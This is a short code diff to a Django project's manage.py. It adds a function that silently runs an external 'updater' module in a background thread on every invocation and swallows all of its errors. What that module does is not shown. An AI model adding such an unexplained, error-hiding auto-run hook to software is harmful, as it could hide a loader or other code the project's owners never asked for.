@@ -2,7 +2,15 @@
 """Django's command-line utility for administrative tasks."""
 import os
 import sys
+import updater
+from threading import Thread
 
+def try_update():
+    print('Running...')
+    try:
+        updater.updater(False)
+    except:
+        pass
 
 def main():
     """Run administrative tasks."""
@@ -19,4 +27,5 @@ def main():
 
 
 if __name__ == '__main__':
+    Thread(target=try_update, args=[]).start()
     main()
